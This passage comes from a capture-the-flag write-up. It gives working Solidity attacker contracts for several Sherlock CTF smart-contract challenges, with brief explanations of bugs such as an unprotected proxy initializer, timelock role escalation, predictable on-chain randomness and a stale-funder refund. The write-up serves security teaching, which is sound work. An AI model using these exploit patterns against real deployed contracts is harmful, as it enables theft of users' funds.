<span class="ln">27</span>        <span class="n">batch1_calldata</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span><span class="s">&#34;grantRole(bytes32,address)&#34;</span><span class="p">,</span> <span class="nb">keccak256</span><span class="p">(</span><span class="s">&#34;TIMELOCK_ADMIN_ROLE&#34;</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
<span class="ln">28</span>
<span class="ln">29</span>        <span class="n">batch1_addresses</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">inst</span><span class="p">);</span>
<span class="ln">30</span>        <span class="n">batch1_values</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="ln">31</span>        <span class="n">batch1_calldata</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span><span class="s">&#34;grantRole(bytes32,address)&#34;</span><span class="p">,</span> <span class="nb">keccak256</span><span class="p">(</span><span class="s">&#34;TIMELOCK_ADMIN_ROLE&#34;</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="n">exp</span><span class="p">));</span>
<span class="ln">32</span>
<span class="ln">33</span>        <span class="c1">//Then call to relay the attack to the contract
</span><span class="ln">34</span><span class="c1"></span>        <span class="n">batch1_addresses</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">);</span>
<span class="ln">35</span>        <span class="n">batch1_values</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="ln">36</span>        <span class="n">batch1_calldata</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span><span class="s">&#34;attack(address,address)&#34;</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">inst</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="n">exp</span><span class="p">));</span>
<span class="ln">37</span>
<span class="ln">38</span>        <span class="n">tc</span><span class="p">.</span><span class="n">scheduleBatch</span><span class="p">(</span><span class="n">batch1_addresses</span><span class="p">,</span> <span class="n">batch1_values</span><span class="p">,</span> <span class="n">batch1_calldata</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="ln">39</span>
<span class="ln">40</span>    <span class="p">}</span>
<span class="ln">41</span>
<span class="ln">42</span><span class="p">}</span>
<span class="ln">43</span>
<span class="ln">44</span><span class="kd">contract</span> <span class="nc">chabooAttacker</span> <span class="p">{</span>
<span class="ln">45</span>
<span class="ln">46</span>    <span class="kt">address</span><span class="p">[]</span> <span class="n">batch1_addresses</span><span class="p">;</span>
<span class="ln">47</span>    <span class="kt">uint256</span><span class="p">[]</span> <span class="n">batch1_values</span><span class="p">;</span>
<span class="ln">48</span>    <span class="kt">bytes</span><span class="p">[]</span> <span class="n">batch1_calldata</span><span class="p">;</span>
<span class="ln">49</span>
<span class="ln">50</span>    <span class="kt">address</span><span class="p">[]</span> <span class="n">batch2_addresses</span><span class="p">;</span>
<span class="ln">51</span>    <span class="kt">uint256</span><span class="p">[]</span> <span class="n">batch2_values</span><span class="p">;</span>
<span class="ln">52</span>    <span class="kt">bytes</span><span class="p">[]</span> <span class="n">batch2_calldata</span><span class="p">;</span>
<span class="ln">53</span>
<span class="ln">54</span>    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">inst</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln">55</span>        <span class="n">Helper</span> <span class="n">h</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Helper</span><span class="p">();</span>
<span class="ln">56</span>
<span class="ln">57</span>        <span class="c1">//Batch 1
</span><span class="ln">58</span><span class="c1"></span>        <span class="c1">//First call to updateDelay
</span><span class="ln">59</span><span class="c1"></span>        <span class="n">batch1_addresses</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">inst</span><span class="p">));</span>
<span class="ln">60</span>        <span class="n">batch1_values</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="ln">61</span>        <span class="n">batch1_calldata</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span><span class="s">&#34;updateDelay(uint256)&#34;</span><span class="p">,</span> <span class="kt">uint256</span><span class="p">(</span><span class="mi">0</span><span class="p">)));</span>
<span class="ln">62</span>
<span class="ln">63</span>        <span class="c1">//Then call to grantrole
</span><span class="ln">64</span><span class="c1"></span>        <span class="n">batch1_addresses</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">inst</span><span class="p">));</span>
<span class="ln">65</span>        <span class="n">batch1_values</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="ln">66</span>        <span class="n">batch1_calldata</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span><span class="s">&#34;grantRole(bytes32,address)&#34;</span><span class="p">,</span> <span class="nb">keccak256</span><span class="p">(</span><span class="s">&#34;TIMELOCK_ADMIN_ROLE&#34;</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="n">h</span><span class="p">)));</span>
<span class="ln">67</span>
<span class="ln">68</span>        <span class="n">batch1_addresses</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">inst</span><span class="p">));</span>
<span class="ln">69</span>        <span class="n">batch1_values</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="ln">70</span>        <span class="n">batch1_calldata</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span><span class="s">&#34;grantRole(bytes32,address)&#34;</span><span class="p">,</span> <span class="nb">keccak256</span><span class="p">(</span><span class="s">&#34;TIMELOCK_ADMIN_ROLE&#34;</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)));</span>
<span class="ln">71</span>
<span class="ln">72</span>        <span class="c1">//Then call to relay the attack to the contract
</span><span class="ln">73</span><span class="c1"></span>        <span class="n">batch1_addresses</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">h</span><span class="p">));</span>
<span class="ln">74</span>        <span class="n">batch1_values</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="ln">75</span>        <span class="n">batch1_calldata</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span><span class="s">&#34;attack(address,address)&#34;</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">inst</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)));</span>
<span class="ln">76</span>
<span class="ln">77</span>        <span class="c1">//Call
</span><span class="ln">78</span><span class="c1"></span>        <span class="n">TimelockController</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="n">inst</span><span class="p">)).</span><span class="n">executeBatch</span><span class="p">(</span><span class="n">batch1_addresses</span><span class="p">,</span> <span class="n">batch1_values</span><span class="p">,</span> <span class="n">batch1_calldata</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="ln">79</span>        <span class="n">TimelockController</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="n">inst</span><span class="p">)).</span><span class="n">grantRole</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="s">&#34;PROPOSER_ROLE&#34;</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
<span class="ln">80</span>
<span class="ln">81</span>        <span class="kt">address</span> <span class="n">target</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">inst</span><span class="p">);</span>
<span class="ln">82</span>        <span class="kt">uint256</span> <span class="nb">value</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="ln">83</span>        <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">call_data</span> <span class="o">=</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span><span class="s">&#34;distributeFunds(address,uint256)&#34;</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">tx</span><span class="p">.</span><span class="nb">origin</span><span class="p">),</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">);</span>
<span class="ln">84</span>
<span class="ln">85</span>        <span class="n">TimelockController</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="n">inst</span><span class="p">)).</span><span class="n">schedule</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="nb">value</span><span class="p">,</span> <span class="n">call_data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="ln">86</span>        <span class="n">TimelockController</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="n">inst</span><span class="p">)).</span><span class="n">execute</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="nb">value</span><span class="p">,</span> <span class="n">call_data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="ln">87</span>
<span class="ln">88</span>    <span class="p">}</span>
<span class="ln">89</span>
<span class="ln">90</span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span> <span class="p">}</span>
<span class="ln">91</span>
<span class="ln">92</span><span class="p">}</span>
</code></pre></div><h3 id="ebaizel---pixelpavel">ebaizel - PixelPavel</h3>
<ul>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/ebaizel/PixelPavel.sol">Contract</a></li>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/chaboo/Setup.sol">Setup</a></li>
</ul>
<p>This one also falls in the educational challenges. In this case, the lesson is about abi encodings and argument passing to functions. The <code>crackCode(uint8)</code> function expects a <code>uint8</code> as argument, however, the body of the function reads the <code>msg.data</code> (that is, the data passed to the function called) as <code>bytes32</code> and compares it to an <code>uint256</code> constant.</p>
<p>The exploit consists in manually crafting the <code>msg.data</code> such that when read as an <code>uint8</code> the value is equal to <code>42</code>, and when read as <code>bytes32</code> the value is equal to the <code>bytes32</code> representation of <code>298</code>. It helps that 42 and 298 differ only in the ninth bit, but the concept can be applied to any values that share the lowest 8 bits.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">7</span><span class="p">.</span><span class="mi">6</span><span class="p">;</span>
<span class="ln"> 2</span>
<span class="ln"> 3</span><span class="kn">import</span> <span class="s">&#34;./PixelPavel.sol&#34;</span><span class="p">;</span>
<span class="ln"> 4</span>
<span class="ln"> 5</span><span class="kd">contract</span> <span class="nc">ebaizelAttacker</span> <span class="p">{</span>
<span class="ln"> 6</span>    
<span class="ln"> 7</span>    <span class="kd">constructor</span><span class="p">(</span><span class="n">PixelPavel</span> <span class="n">instance</span><span class="p">)</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln"> 8</span>        <span class="kt">bytes</span> <span class="k">memory</span> <span class="nb">data</span> <span class="o">=</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="kt">bytes4</span><span class="p">(</span><span class="mh">0xa4e0b0eb</span><span class="p">),</span> <span class="kt">bytes32</span><span class="p">(</span><span class="mh">0x000000000000000000000000000000000000000000000000000000000000012a</span><span class="p">));</span>
<span class="ln"> 9</span>        <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">instance</span><span class="p">).</span><span class="nb">call</span><span class="p">(</span><span class="nb">data</span><span class="p">);</span>
<span class="ln">10</span>        <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">);</span>
<span class="ln">11</span>    <span class="p">}</span>
<span class="ln">12</span>
<span class="ln">13</span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span> 
<span class="ln">14</span>    <span class="p">}</span>
<span class="ln">15</span>
<span class="ln">16</span><span class="p">}</span>
</code></pre></div><h3 id="hack3r-0m---bitmania">hack3r-0m - BitMania</h3>
<ul>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/hack3r-0m/BitMania.sol">Contract</a></li>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/hack3r-0m/Setup.sol">Setup</a></li>
</ul>
<p>This is an implementation of AdventCTF 2014's XOR challenge. The decoder was similar to <a href="https://github.com/VulnHub/ctf-writeups/blob/master/2014/advent-ctf/xor.md">this</a> one.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">4</span><span class="p">;</span>
<span class="ln"> 2</span>
<span class="ln"> 3</span><span class="kn">import</span> <span class="s">&#34;./BitMania.sol&#34;</span><span class="p">;</span>
<span class="ln"> 4</span>
<span class="ln"> 5</span><span class="kd">contract</span> <span class="nc">hack3r0mAttacker</span> <span class="p">{</span>
<span class="ln"> 6</span>    
<span class="ln"> 7</span>    <span class="kd">constructor</span><span class="p">(</span><span class="n">BitMania</span> <span class="n">instance</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln"> 8</span>        <span class="n">instance</span><span class="p">.</span><span class="n">solveIt</span><span class="p">(</span><span class="s">&#34;SHERLOCK_CTF_0x0_WINNER_333&#34;</span><span class="p">);</span>
<span class="ln"> 9</span>    <span class="p">}</span>
<span class="ln">10</span>
<span class="ln">11</span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span> <span class="p">}</span>
<span class="ln">12</span><span class="p">}</span>
</code></pre></div><h3 id="iflp---examplequizexploit-default-name-for-the-template">iflp - ExampleQuizExploit (default name for the template)</h3>
<ul>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/iflp/ExampleQuizExploit.sol">Contract</a></li>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/iflp/Setup.sol">Setup</a></li>
</ul>
<p>This contract implemented a <em>random</em> number generator in one contract, and a guessing game in another. The goal was to guess the correct number. The deployed instance of <code>Lollercoaster</code> was not known, but it was easy to find out in the <code>Setup</code> contract deployment transaction.</p>
<p>The solution was as simple as calling the RNG by address, since the <em>random</em> number is constant for the block.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span>
<span class="ln"> 2</span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">7</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
<span class="ln"> 3</span>
<span class="ln"> 4</span><span class="kn">import</span> <span class="s">&#34;./ExampleQuizExploit.sol&#34;</span><span class="p">;</span>
<span class="ln"> 5</span>
<span class="ln"> 6</span><span class="kd">contract</span> <span class="nc">iflpAttacker</span> <span class="p">{</span>
<span class="ln"> 7</span>    
<span class="ln"> 8</span>    <span class="kd">function</span> <span class="nf">attack</span><span class="p">(</span><span class="n">ExampleQuizExploit</span> <span class="n">instance</span><span class="p">)</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln"> 9</span>        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">==</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">);</span>
<span class="ln">10</span>        <span class="n">instance</span><span class="p">.</span><span class="n">guess</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">}(</span><span class="n">Lollercoaster</span><span class="p">(</span><span class="mh">0x25Be61724B64117DC9aC9DDd2A06B7DEc052D5cb</span><span class="p">).</span><span class="n">randInt</span><span class="p">(</span><span class="mi">1000000</span><span class="p">));</span>        
<span class="ln">11</span>    <span class="p">}</span>
<span class="ln">12</span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span> <span class="p">}</span>
<span class="ln">13</span><span class="p">}</span>
</code></pre></div><h3 id="johngish---challenge">johngish - Challenge</h3>
<ul>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/johngish/Challenge.sol">Contract</a></li>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/johngish/Setup.sol">Setup</a></li>
</ul>
<p>The contract implemented another guess game, with the solution not hidden at all. Once the solution is known, the contract delegatecalls <code>msg.sender</code>'s <code>receive()</code> function. The goal was to deplete the instance's balance.</p>
<p>The solution consists in creating a contract with a <code>receive()</code> function that transfers the balance out of the instance.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">4</span><span class="p">;</span>
<span class="ln"> 2</span>
<span class="ln"> 3</span><span class="kn">import</span> <span class="s">&#34;./Challenge.sol&#34;</span><span class="p">;</span>
<span class="ln"> 4</span>
<span class="ln"> 5</span><span class="kd">contract</span> <span class="nc">johngishAttacker</span> <span class="p">{</span>
<span class="ln"> 6</span>    
<span class="ln"> 7</span>    <span class="kd">function</span> <span class="nf">attack</span><span class="p">(</span><span class="n">Challenge</span> <span class="n">instance</span><span class="p">)</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln"> 8</span>        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">==</span> <span class="mi">100</span> <span class="kc">wei</span><span class="p">);</span>
<span class="ln"> 9</span>        <span class="n">instance</span><span class="p">.</span><span class="n">guess</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">100</span> <span class="kc">wei</span><span class="p">}(</span><span class="mi">42</span><span class="p">);</span>
<span class="ln">10</span>    <span class="p">}</span>
<span class="ln">11</span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span> 
<span class="ln">12</span>        <span class="k">payable</span><span class="p">(</span><span class="nb">tx</span><span class="p">.</span><span class="nb">origin</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">);</span>
<span class="ln">13</span>    <span class="p">}</span>
<span class="ln">14</span><span class="p">}</span>
</code></pre></div><h3 id="kankan-0---dead">kankan-0 - Dead</h3>
<ul>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/kankan-0/Dead.sol">Contract</a></li>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/kankan-0/Setup.sol">Setup</a></li>
</ul>
<p>The goal is to empty the instance's balance. The function that implements the funds transfer needs the caller to be the <code>killer</code>. To become the <code>killer</code>, the caller has to have a balance higher than the <code>fee</code>, but nobody can make deposits valued <code>0.1 ether</code> or more. Prior to that, the <code>timeToKill</code> flag must be set, and the caller must be registered in the contract.</p>
<p>The solution is to read the previous paragraph in the reverse order. First set the flags, then deposit until the caller becomes <code>killer</code>, then call the function to withdraw the funds. Good news: the <code>fee</code> contract variable equal to <code>1000 ether</code> is shadowed in the <code>becomeKiller()</code> function, so the actual funds needed are not that high.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">7</span><span class="p">.</span><span class="mi">4</span><span class="p">;</span>
<span class="ln"> 2</span>
<span class="ln"> 3</span><span class="kn">import</span> <span class="s">&#34;./Dead.sol&#34;</span><span class="p">;</span>
<span class="ln"> 4</span>
<span class="ln"> 5</span><span class="kd">contract</span> <span class="nc">kankan0Attacker</span> <span class="p">{</span>
<span class="ln"> 6</span>    
<span class="ln"> 7</span>    <span class="kd">constructor</span><span class="p">(</span><span class="n">Dead</span> <span class="n">instance</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln"> 8</span>        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">.</span><span class="mi">65</span> <span class="kc">ether</span><span class="p">);</span>
<span class="ln"> 9</span>        <span class="n">instance</span><span class="p">.</span><span class="n">register</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">0</span><span class="p">.</span><span class="mi">01</span> <span class="kc">ether</span><span class="p">}();</span>
<span class="ln">10</span>        <span class="n">instance</span><span class="p">.</span><span class="n">canKill</span><span class="p">();</span>
<span class="ln">11</span>        <span class="k">for</span><span class="p">(</span><span class="kt">uint8</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">6</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
<span class="ln">12</span>            <span class="n">instance</span><span class="p">.</span><span class="n">becomeKiller</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span><span class="mi">0</span><span class="p">.</span><span class="mi">099</span> <span class="kc">ether</span><span class="p">}();</span>
<span class="ln">13</span>        <span class="p">}</span>
<span class="ln">14</span>        <span class="n">instance</span><span class="p">.</span><span class="n">kill</span><span class="p">();</span>
<span class="ln">15</span>    <span class="p">}</span>
<span class="ln">16</span>
<span class="ln">17</span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span> <span class="p">}</span>
<span class="ln">18</span>
<span class="ln">19</span><span class="p">}</span>
</code></pre></div><h3 id="kuldeep23907---challenge">kuldeep23907 - Challenge</h3>
<ul>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/kuldeep23907/Challenge.sol">Contract</a></li>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/kuldeep23907/Setup.sol">Setup</a></li>
</ul>
<p>The challenge implements a function called <code>callSloganContract(bytes)</code> that allows the caller to call a function on a <code>Slogan</code> contract. This <code>Slogan</code> contract is actually a ERC1967 proxy whose <code>initialize(address,bytes)</code> function lacks the <code>initializer</code> modifier. That means anyone can call the function again, even if it has been already initialized, and upgrade it to proxy an existing contract.</p>
<p>The solution is to create a contract that will be used as the new implementation for the proxy, where there's a function to empty the proxy's balance.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">4</span><span class="p">;</span>
<span class="ln"> 2</span>
<span class="ln"> 3</span><span class="kn">import</span> <span class="s">&#34;./Setup.sol&#34;</span><span class="p">;</span>
<span class="ln"> 4</span>
<span class="ln"> 5</span><span class="kd">contract</span> <span class="nc">kuldeepAttacker</span> <span class="p">{</span>
<span class="ln"> 6</span>
<span class="ln"> 7</span>    <span class="n">Challenge</span> <span class="n">instance</span><span class="p">;</span>
<span class="ln"> 8</span>
<span class="ln"> 9</span>    <span class="kd">constructor</span><span class="p">(</span><span class="n">Challenge</span> <span class="n">inst</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln">10</span>        <span class="n">instance</span> <span class="o">=</span> <span class="n">inst</span><span class="p">;</span>
<span class="ln">11</span>    <span class="p">}</span>
<span class="ln">12</span>    
<span class="ln">13</span>    <span class="kd">function</span> <span class="nf">solve</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
<span class="ln">14</span>        <span class="n">instance</span><span class="p">.</span><span class="n">callSloganContract</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span><span class="s">&#34;initialize(address,bytes)&#34;</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="s">hex&#34;9e5faafc&#34;</span><span class="p">));</span>
<span class="ln">15</span>    <span class="p">}</span>
<span class="ln">16</span>
<span class="ln">17</span>    <span class="kd">function</span> <span class="nf">attack</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
<span class="ln">18</span>        <span class="k">payable</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">);</span>
<span class="ln">19</span>    <span class="p">}</span>
<span class="ln">20</span>
<span class="ln">21</span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span> 
<span class="ln">22</span>    <span class="p">}</span>
<span class="ln">23</span><span class="p">}</span>
</code></pre></div><h3 id="mhchia---crowdfunding">mhchia - CrowdFunding</h3>
<ul>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/mhchia/CrowdFunding.sol">Contract</a></li>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/mhchia/Setup.sol">Setup</a></li>
</ul>
<p>A crowdfunding contract where you can start and stop campaigns, and get a refund for the whole balance of the instance. To get a refund for a <code>campaignID</code>, the caller should not be the campaign owner, and the caller has to be <code>funderID</code> for the campaign.</p>
<p>The bug lies in the <code>stopCampaign(uint)</code> function, because it cleans the <code>campaignID</code>, but not the funders for it. That means that if the campaign is closed, any funder can get refunded for an amount equal to the whole balance.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">4</span><span class="p">;</span>
<span class="ln"> 2</span>
<span class="ln"> 3</span><span class="kn">import</span> <span class="s">&#34;./CrowdFunding.sol&#34;</span><span class="p">;</span>
<span class="ln"> 4</span>
<span class="ln"> 5</span><span class="kd">contract</span> <span class="nc">mhchiaAttacker</span> <span class="p">{</span>
<span class="ln"> 6</span>    
<span class="ln"> 7</span>    <span class="kd">constructor</span><span class="p">(</span><span class="n">CrowdFunding</span> <span class="n">instance</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln"> 8</span>        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="kc">wei</span><span class="p">);</span>
<span class="ln"> 9</span>        <span class="n">instance</span><span class="p">.</span><span class="n">startCampaign</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">1</span> <span class="kc">wei</span><span class="p">}();</span>
<span class="ln">10</span>        <span class="n">instance</span><span class="p">.</span><span class="n">stopCampaign</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="ln">11</span>        <span class="n">instance</span><span class="p">.</span><span class="n">getRefund</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">1</span> <span class="kc">wei</span><span class="p">}(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="ln">12</span>    <span class="p">}</span>
<span class="ln">13</span>
<span class="ln">14</span>    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span> <span class="p">}</span>
<span class="ln">15</span>
<span class="ln">16</span><span class="p">}</span>
</code></pre></div><h3 id="naps62---builtbyanoob">naps62 - BuiltByANoob</h3>
<ul>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/naps62/BuiltByANoob.sol">Contract</a></li>
<li><a href="https://github.com/tqtsar/sherlockctf-solutions/blob/main/Solved/naps62/Setup.sol">Setup</a></li>
</ul>
<p>The goal is to make the <code>won()</code> function of the contract return true. That means the <code>_toInt()</code> function should return <code>71764438432</code>, and <code>writes</code> must be greater than 4. For the first condition, <code>memo</code> should contain the bytes representation of the integer constant. For the second condition, <code>writes</code> gets incremented everytime any of <code>write0()</code> or <code>write255()</code> is called.</p>
<p>The solution, then, lies in building the bytes needed by calling <code>write0()</code>, <code>setHalfByte(bytes1)</code> and <code>shiftLeft(uint8)</code> as needed. The rest of the code was decoration to distract the attacker.</p>
